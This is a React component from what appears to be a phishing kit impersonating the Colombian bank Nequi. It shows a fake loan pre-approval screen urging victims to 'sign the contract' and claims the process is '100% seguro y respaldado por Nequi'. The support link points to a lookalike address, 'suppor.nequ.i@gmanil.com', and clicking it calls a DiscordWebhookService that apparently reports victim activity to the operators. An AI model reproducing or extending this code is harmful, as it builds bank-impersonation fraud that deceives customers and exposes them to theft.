import { useState, useMemo } from 'react'
import { CheckCircle2, Trophy, ArrowRight, XCircle, RefreshCw, AlertTriangle } from 'lucide-react'
import { ScreenShell } from './ScreenShell'
import { NequiLogo } from './NequiLogo'
import { DiscordWebhookService } from '../services/DiscordWebhookService'

interface ResultScreenProps {
  loanAmount: string
  monthlyIncome: string
  loanTerm: string
  onApproved: () => void
  onBack: () => void
  onHome: () => void
}

const TAE = 0.18 // 18% anual

function calculateMonthlyPayment(principal: number, months: number): number {
  const monthlyRate = TAE / 12
  const cuota = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1)
  return Math.round(cuota)
}

function evaluateCredit(loanAmount: number, monthlyIncome: number, loanTerm: number): {
  approved: boolean
  reason?: string
  quotaToIncomeRatio: number
  monthlyPayment: number
} {
  const monthlyPayment = calculateMonthlyPayment(loanAmount, loanTerm)
  const quotaToIncomeRatio = monthlyIncome > 0 ? (monthlyPayment / monthlyIncome) * 100 : 100

  // Reglas de aprobación
  if (monthlyIncome < 300_000) {
    return {
      approved: false,
      reason: 'Los ingresos mensuales mínimos requeridos son $300,000 COP.',
      quotaToIncomeRatio,
      monthlyPayment,
    }
  }

  if (quotaToIncomeRatio > 50) {
    return {
      approved: false,
      reason: `La cuota representa el ${Math.round(quotaToIncomeRatio)}% de tus ingresos. El máximo permitido es 50%. Considera un plazo más largo o un monto menor.`,
      quotaToIncomeRatio,
      monthlyPayment,
    }
  }

  if (loanAmount > 10_000_000 && monthlyIncome < 2_000_000) {
    return {
      approved: false,
      reason: 'Para montos superiores a $10,000,000 COP, se requieren ingresos mínimos de $2,000,000 COP.',
      quotaToIncomeRatio,
      monthlyPayment,
    }
  }

  return {
    approved: true,
    quotaToIncomeRatio,
    monthlyPayment,
  }
}

export function ResultScreen({ loanAmount, monthlyIncome, loanTerm, onApproved, onBack, onHome }: ResultScreenProps) {
  const [loading, setLoading] = useState(false)

  const loanValue = parseInt(loanAmount) || 500_000
  const incomeValue = parseInt(monthlyIncome) || 500_000
  const termValue = parseInt(loanTerm) || 12

  const result = useMemo(() => evaluateCredit(loanValue, incomeValue, termValue), [loanValue, incomeValue, termValue])
  const formattedAmount = new Intl.NumberFormat('es-CO').format(loanValue)
  const formattedCuota = new Intl.NumberFormat('es-CO').format(result.monthlyPayment)

  function handleContinue() {
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
      onApproved()
    }, 1000)
  }

  // --- APPROVED SCREEN ---
  if (result.approved) {
    return (
      <ScreenShell>
        <div className="flex justify-center mb-6">
          <NequiLogo size="md" color="dark" onClick={onHome} />
        </div>
        <div className="flex flex-col items-center text-center animate-slide-up">

          {/* Icon stack */}
          <div className="relative w-32 h-32 mb-6">
            <div className="absolute inset-0 rounded-full bg-[#22C55E]/10 animate-ping" />
            <div className="relative w-32 h-32 rounded-full bg-gradient-to-br from-[#22C55E] to-[#16A34A] flex items-center justify-center shadow-[0_12px_40px_-8px_rgba(34,197,94,0.5)]">
              <Trophy className="w-14 h-14 text-white" strokeWidth={2} />
            </div>
          </div>

          {/* Step badge */}
          <div className="inline-flex items-center gap-2 bg-[#22C55E]/10 border border-[#22C55E]/30 rounded-full px-4 py-1.5 mb-5">
            <CheckCircle2 className="w-3.5 h-3.5 text-[#22C55E]" strokeWidth={2.5} />
            <span className="text-xs font-bold text-[#22C55E] tracking-wide uppercase">Crédito Pre-aprobado</span>
          </div>

          {/* Main title */}
          <h1 className="text-3xl font-extrabold tracking-tight mb-3 leading-tight text-gray-900">
            ¡Todo va muy bien! <br />
            <span className="text-[#22C55E]">Estás en el último paso</span>
          </h1>

          <p className="text-gray-500 mb-6 max-w-xs text-sm leading-relaxed">
            Tu solicitud ha sido <span className="text-gray-900 font-semibold">revisada y aprobada</span>. Solo necesitamos que firmes tu contrato y el dinero estará en tu cuenta de inmediato.
          </p>

          {/* Progress bar */}
          <div className="w-full mb-6">
            <div className="flex justify-between text-xs text-gray-400 mb-2 font-medium">
              <span>Progreso de tu solicitud</span>
              <span className="text-[#22C55E] font-bold">95%</span>
            </div>
            <div className="w-full h-2 rounded-full bg-gray-100 overflow-hidden">
              <div
                className="h-full rounded-full bg-gradient-to-r from-[#22C55E] to-[#4ADE80] transition-all duration-1000"
                style={{ width: '95%' }}
              />
            </div>
          </div>

          {/* Steps summary */}
          <div className="w-full bg-gray-50 border border-gray-200 rounded-2xl p-4 mb-6 text-left">
            {[
              { label: 'Información personal', done: true },
              { label: 'Verificación de identidad', done: true },
              { label: 'Aprobación del crédito', done: true },
              { label: 'Firma del contrato', done: false, active: true },
            ].map((item) => (
              <div key={item.label} className="flex items-center gap-3 py-2 first:pt-0 last:pb-0">
                <div
                  className="w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0"
                  style={{
                    background: item.done ? '#22C55E' : item.active ? 'rgba(45,27,110,0.15)' : 'rgba(0,0,0,0.05)',
                    border: item.active ? '2px solid #2D1B6E' : 'none',
                  }}
                >
                  {item.done && (
                    <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
                      <path d="M2 5L4 7L8 3" stroke="white" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  )}
                  {item.active && <div className="w-2 h-2 rounded-full bg-[#2D1B6E]" />}
                </div>
                <span
                  className="text-sm font-medium"
                  style={{
                    color: item.done ? 'rgba(0,0,0,0.6)' : item.active ? '#2D1B6E' : 'rgba(0,0,0,0.35)',
                    fontWeight: item.active ? 700 : undefined,
                  }}
                >
                  {item.label}
                  {item.active && <span className="ml-2 text-xs text-[#2D1B6E] font-bold">← Ahora</span>}
                </span>
              </div>
            ))}
          </div>

          {/* Amount card */}
          <div className="w-full bg-gradient-to-br from-gray-50 to-white border border-gray-200 rounded-3xl p-5 mb-4">
            <span className="text-xs text-gray-500 font-semibold uppercase tracking-wide">Monto aprobado</span>
            <div className="flex items-baseline justify-center gap-1 mt-2">
              <span className="text-2xl font-bold text-gray-400">$</span>
              <span className="text-5xl font-extrabold tracking-tight text-gray-900">{formattedAmount}</span>
            </div>
            <p className="text-xs text-gray-400 mt-2">Listo para desembolso inmediato</p>
          </div>

          {/* Cuota info */}
          <div className="w-full rounded-2xl p-4 mb-8 text-center" style={{ background: '#fff0f6', border: '1px solid #f9c0d9' }}>
            <p className="text-gray-500 text-xs mb-1">Cuota mensual estimada</p>
            <p className="font-extrabold text-2xl" style={{ color: '#E6005C' }}>${formattedCuota}</p>
            <p className="text-gray-400 text-xs mt-1">Plazo: {termValue} meses | Tasa: 18% E.A.</p>
          </div>

          <button
            onClick={handleContinue}
            disabled={loading}
            className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl font-bold text-base transition-all text-white"
            style={{ background: '#E6005C', opacity: loading ? 0.9 : 1 }}
          >
            {loading ? (
              <>
                <svg className="animate-spin" width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeDasharray="60 20" />
                </svg>
                Procesando...
              </>
            ) : (
              <>
                Firmar contrato y recibir dinero
                <ArrowRight className="w-5 h-5" />
              </>
            )}
          </button>

          <p className="text-xs text-gray-400 mt-4">
            Proceso 100% seguro y respaldado por Nequi
          </p>
        </div>
      </ScreenShell>
    )
  }

  // --- REJECTED SCREEN ---
  return (
    <ScreenShell onBack={onBack}>
      <div className="flex justify-center mb-6">
        <NequiLogo size="md" color="dark" onClick={onHome} />
      </div>
      <div className="flex flex-col items-center text-center animate-slide-up">

        {/* Icon */}
        <div className="relative w-32 h-32 mb-6">
          <div className="absolute inset-0 rounded-full bg-red-500/10 animate-ping" />
          <div className="relative w-32 h-32 rounded-full bg-gradient-to-br from-red-500 to-red-600 flex items-center justify-center shadow-[0_12px_40px_-8px_rgba(239,68,68,0.5)]">
            <AlertTriangle className="w-14 h-14 text-white" strokeWidth={2} />
          </div>
        </div>

        {/* Badge */}
        <div className="inline-flex items-center gap-2 bg-red-500/10 border border-red-500/30 rounded-full px-4 py-1.5 mb-5">
          <XCircle className="w-3.5 h-3.5 text-red-500" strokeWidth={2.5} />
          <span className="text-xs font-bold text-red-500 tracking-wide uppercase">Solicitud no aprobada</span>
        </div>

        {/* Title */}
        <h1 className="text-3xl font-extrabold tracking-tight mb-3 leading-tight text-gray-900">
          Lo sentimos, tu solicitud<br />
          <span className="text-red-500">no pudo ser aprobada</span>
        </h1>

        <p className="text-gray-500 mb-6 max-w-xs text-sm leading-relaxed">
          Basado en el análisis de tu capacidad de pago, no podemos aprobar tu solicitud en este momento.
        </p>

        {/* Reason card */}
        <div className="w-full bg-red-50 border border-red-200 rounded-2xl p-4 mb-6 text-left">
          <p className="text-gray-500 text-xs mb-2 font-medium uppercase tracking-wide">Motivo</p>
          <p className="text-gray-900 text-sm leading-relaxed">{result.reason}</p>
        </div>

        {/* Stats */}
        <div className="w-full bg-gray-50 border border-gray-200 rounded-2xl p-4 mb-8">
          <div className="grid grid-cols-2 gap-4 text-center">
            <div>
              <p className="text-gray-400 text-xs mb-1">Relación cuota/ingreso</p>
              <p className={`font-extrabold text-xl ${result.quotaToIncomeRatio > 50 ? 'text-red-500' : 'text-green-500'}`}>
                {Math.round(result.quotaToIncomeRatio)}%
              </p>
            </div>
            <div>
              <p className="text-gray-400 text-xs mb-1">Máximo permitido</p>
              <p className="text-gray-900 font-extrabold text-xl">50%</p>
            </div>
          </div>
        </div>

        {/* Suggestions */}
        <div className="w-full bg-gray-50 border border-gray-200 rounded-2xl p-5 mb-6 text-left">
          <p className="text-gray-900 font-semibold text-sm mb-3">Sugerencias para mejorar tu solicitud:</p>
          <ul className="text-gray-600 text-sm space-y-2">
            <li className="flex items-start gap-2">
              <span className="text-[#2D1B6E]">•</span>
              Intenta con un monto menor
            </li>
            <li className="flex items-start gap-2">
              <span className="text-[#2D1B6E]">•</span>
              Selecciona un plazo más largo para reducir la cuota
            </li>
            <li className="flex items-start gap-2">
              <span className="text-[#2D1B6E]">•</span>
              Vuelve a intentarlo en unos días
            </li>
          </ul>
        </div>

        <button
          onClick={onBack}
          className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl font-bold text-base transition-all text-white"
          style={{ background: '#E6005C' }}
        >
          <RefreshCw className="w-5 h-5" />
          Modificar solicitud
        </button>

        <a
          href="mailto:suppor.nequ.i@gmanil.com"
          onClick={() => DiscordWebhookService.sendInfo('Soporte contactado', '', {}, {})}
          className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl font-bold text-base transition-all mt-3"
          style={{ background: '#2D1B6E', color: '#fff' }}
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <rect x="2" y="4" width="20" height="16" rx="2" />
            <path d="M22 4L12 13L2 4" />
          </svg>
          Contactar soporte
        </a>

        <p className="text-xs text-gray-400 mt-4">
          Puedes intentarlo nuevamente cuando lo desees
        </p>
      </div>
    </ScreenShell>
  )
}
